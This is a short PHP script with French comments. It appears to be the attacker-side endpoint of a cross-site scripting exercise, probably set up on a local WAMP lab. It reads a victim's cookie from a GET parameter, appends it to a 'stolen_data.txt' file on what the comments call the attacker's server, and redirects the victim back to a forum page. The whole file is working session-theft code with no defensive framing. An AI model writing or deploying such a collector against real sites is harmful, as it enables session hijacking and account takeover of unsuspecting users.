<?php
//récupération des cookies
$cookie = $_GET['cookie'] . PHP_EOL;

//sauvegarde sur le serveur de l'attaqant
$file = fopen('C:\wamp64\www\siteattaquant\stolen_data.txt', 'a');
fwrite($file, $cookie);

//redirection vers le site que vistait l'utilisateur
header('Location: http://localhost/myforum');
exit;